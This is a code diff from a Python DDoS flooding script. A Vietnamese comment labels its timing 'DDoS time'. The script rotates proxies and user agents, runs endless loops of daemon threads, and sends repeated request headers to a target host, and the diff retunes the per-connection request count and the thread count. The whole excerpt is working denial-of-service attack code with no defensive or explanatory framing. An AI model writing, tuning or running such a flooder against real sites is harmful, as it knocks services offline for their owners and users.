@@ -90,7 +90,7 @@ def makeRequests(_HOST, _PORT, _USERAGENTS, _PROXIES, _PATH):
             if _PORT == 443:
                 conn = ssl.create_default_context().wrap_socket(conn, server_hostname=_HOST)
             try:
-                for ifghhgf in range(1,200):
+                for ifghhgf in range(1,500):
                     conn.send(_HEADERS.encode())
 
                 conn.close()
@@ -107,7 +107,7 @@ def main():
     _USERAGENTS = getUserAgents(10000)
     _PROXIES = readLines(_FILE)
     while True:
-        for hahh in range(100000):
+        for hahh in range(8000):
                 thread = threading.Thread(target=makeRequests, args=(_HOST, _PORT, _USERAGENTS, _PROXIES, _PATH, ),daemon=True)
                 thread.start()
         time.sleep(30) # Thời gian DDoS (s)
